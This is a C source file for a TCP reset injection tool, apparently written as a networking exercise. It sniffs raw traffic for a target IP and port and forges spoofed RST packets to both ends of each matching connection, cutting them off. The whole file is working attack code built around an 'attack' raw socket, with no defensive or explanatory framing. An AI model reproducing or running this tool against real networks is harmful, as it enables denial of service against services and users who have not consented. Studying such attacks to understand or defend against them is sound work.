/*
 *   A reseter that blocks TCP communication to a given service.
 *   It sniffs all traffic for packets that match the given IP and port,
 *   And it will send out reset packets to both the service and the sender
 *   of packets to terminate the communication.
*/
#include <signal.h>
#include <sys/wait.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#include <netinet/ip.h>
#include <netinet/tcp.h>
#include<netinet/ip_icmp.h>
#include<netinet/udp.h>


// Constants
#define DATAGRAMSIZE 100 // number of bytes for raw datagram
#define PSEUDOPACKETSIZE 100 // number of bytes for pseudo packet
#define DATAGRAM_MAX 65536 // max number of bytes for IP packets

// Functions
uint16_t ip_checksum(void*,size_t);
void reset(const int, const char *, const char *, const uint32_t, const uint32_t, 
    const uint16_t, const uint16_t, uint32_t, uint32_t);
// void sigint_handler(int);
void sigchld_handler(int);

// Pseudo header needed for calculating the TCP header checksum
struct pshdr {
  uint32_t src_addr;
  uint32_t dst_addr;
  uint8_t reserved;
  uint8_t protocol;
  uint16_t tcp_len;
};

int main(int argc, char *argv[]) {
    int attack_sock, sniff_sock, count = 0, num, rv, yes = 1;
    char service_ip[INET6_ADDRSTRLEN];
    uint16_t service_port;
    struct sockaddr_storage saddr;
    uint32_t service_addr;
    socklen_t addr_len;
    char datagram[DATAGRAMSIZE], pseudo_packet[PSEUDOPACKETSIZE];
    unsigned char buf[DATAGRAM_MAX]; // buffer that holds captured packet
    struct sigaction csa;
    struct iphdr *iph;
    struct tcphdr *tcph, *cstcph;
    struct pshdr *psh;
    uint16_t win = 8192, id0 = rand() %(65536);
    size_t tcp_len;
    struct sockaddr_in sa;

    csa.sa_handler = sigchld_handler; // reap all dead processes
	sigemptyset(&csa.sa_mask);
	csa.sa_flags = SA_RESTART;
	if (sigaction(SIGCHLD, &csa, NULL) == -1) {
		perror("sigaction");
		exit(1);
	}

    if (argc != 3) {
	    fprintf(stderr,"usage: reset service_ip service_port\n");
	    exit(1);
	}

    if (strlen(argv[1]) > INET6_ADDRSTRLEN) {
        fprintf(stderr,"please enter a valid IP\n");
	    exit(1);
    }

    strcpy(service_ip, argv[1]);
    inet_pton(AF_INET, service_ip, &(service_addr)); 

    service_port = (uint16_t) atoi(argv[2]);
    if ((service_port >= USHRT_MAX)) {
        fprintf(stderr,"service_port < %u\n", USHRT_MAX);
	    exit(1);
    }

    service_port = htons(service_port);

    // open attack socket
    if ((attack_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("fakesync: socket\n");
        exit(1);
    }

    // pre-fill TCP, IP and pseudo headers

    // carve out IP header and TCP header
    memset(datagram, 0, sizeof datagram);
    iph = (struct iphdr *) datagram;
    tcph = (struct tcphdr *) (iph + 1);

    tcp_len = sizeof(struct tcphdr);

    iph -> version = 4; // IPv4
    iph -> ihl = 5; // 5 * 32 bits
    iph -> tos = 0; // DSCP: default; ECN: Not ECN-capable transport
    iph -> id = htons(id0); // start ID
    iph -> frag_off = 0x00;
    iph -> ttl = 64; // time to live
    iph -> protocol = IPPROTO_TCP; // TCP
    
    tcph -> doff = 5; // 5 * 32-bit tcp header
    tcph -> ack = 0;
    tcph -> rst = 1;
    tcph -> window = htons(win); // 16 bits
    tcph -> check = 0; // 16 bits. init to 0.
    tcph -> urg_ptr = 0; // 16 bits. indicates the urgent data, if URG flag is set

    // construct psudo packet
    memset(pseudo_packet, 0, sizeof pseudo_packet);
    psh = (struct pshdr *) pseudo_packet;
    cstcph = (struct tcphdr *) (psh + 1);
    memcpy(cstcph, (char *)tcph, tcp_len);

    // pack pseudo header
    psh -> reserved = 0;
    psh -> protocol = IPPROTO_TCP; // TCP
    psh -> tcp_len = htons(tcp_len); // TCP segment length

    // Open sniff socket
    if ((sniff_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
        perror("fakesync: socket\n");
        goto error;
    }

    // main loop
    while(1) {
        // capture frames
        addr_len = sizeof saddr;
        if ((num = recvfrom(sniff_sock, buf, sizeof buf, 0, (struct sockaddr *)&saddr, &addr_len)) < 0)
        {
            perror("recvfrom()\n");
            goto error;
        }

        if (!fork()) {
            close(sniff_sock); // no longer needed
            iph = (struct iphdr *) buf;
            tcph= (struct tcphdr*) (buf + iph->ihl * 4);

            if (iph -> protocol != IPPROTO_TCP) goto final; // check if packet is TCP packet
            if (tcph -> rst == 1) goto final; // ignore reset packets
            if ((iph -> daddr != service_addr) && (iph -> saddr != service_addr)) goto final;
            if ((tcph -> dest != service_port) && (tcph -> source != service_port)) goto final;
            // print_tcp_packet(buf, num); // log the packet

            reset(attack_sock, datagram, pseudo_packet, iph->saddr, iph->daddr, tcph->source, tcph->dest, ntohl(tcph->seq), ntohl(tcph->ack_seq)); // reset the receiver
            reset(attack_sock, datagram, pseudo_packet, iph->daddr, iph->saddr, tcph->dest, tcph->source, ntohl(tcph->ack_seq) + 1, ntohl(tcph->seq)); // reset the sender
            goto final;
        }
    }

final:
    close(attack_sock);
    return 0;
error:
    close(attack_sock);
    close(sniff_sock);
    exit(1);
}

void sigchld_handler(int s)
{
	(void)s; // quiet unused variable warning

	// waitpid() might overwrite errno, so we save and restore it:
	int saved_errno = errno;

	while(waitpid(-1, NULL, WNOHANG) > 0);

	errno = saved_errno;
}

uint16_t ip_checksum(void* vdata,size_t length) {
    // Cast the data pointer to one that can be indexed.
    char* data=(char*)vdata;

    // Initialise the accumulator.
    uint32_t acc=0xffff;

    // Handle complete 16-bit blocks.
    for (size_t i=0;i+1<length;i+=2) {
        uint16_t word;
        memcpy(&word,data+i,2);
        acc+=ntohs(word);
        if (acc>0xffff) {
            acc-=0xffff;
        }
    }

    // Handle any partial block at the end of the data.
    if (length&1) {
        uint16_t word=0;
        memcpy(&word,data+length-1,1);
        acc+=ntohs(word);
        if (acc>0xffff) {
            acc-=0xffff;
        }
    }

    // Return the checksum in network byte order.
    return htons(~acc);
}

void reset(const int attack_sock, const char *datagram, const char *pseudo_packet, const uint32_t saddr, const uint32_t daddr, 
    const uint16_t sport, const uint16_t dport, uint32_t seq0, uint32_t ack0)
{
    int num;
    struct sockaddr_in sa;

    size_t tcp_len = sizeof(struct tcphdr);
    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (iph + 1);
    struct pshdr *psh = (struct pshdr *) pseudo_packet;
    struct tcphdr *cstcph = (struct tcphdr *) (psh + 1);

    // dynamic TCP fields
    tcph -> source = sport; // source port
    cstcph -> source = sport;
    tcph -> dest = dport; // destination port
    cstcph -> dest = dport;
    tcph -> seq = htonl(seq0); // sequence number
    cstcph -> seq = htonl(seq0);
    tcph -> ack_seq = htonl(ack0); // ack sequence number
    cstcph -> ack_seq = htonl(ack0);
    if (ack0 > 0) {
        tcph -> ack = 1;
        cstcph -> ack = 1;
    }

    // dynamic pseudo fields
    psh -> src_addr = saddr;
    psh -> dst_addr = daddr;

    tcph -> check = 0;
    cstcph -> check = 0;

    // calculate check sum
    tcph -> check = ip_checksum((void *)pseudo_packet, sizeof(struct pshdr) + tcp_len); 

    // dynamic IP fields
    iph -> saddr = saddr;
    iph -> daddr = daddr;

    // dynamic sockaddr field
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = daddr;

    if ((num = sendto(attack_sock, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
    {
        perror("fakesync: sendto()\n");
    }
}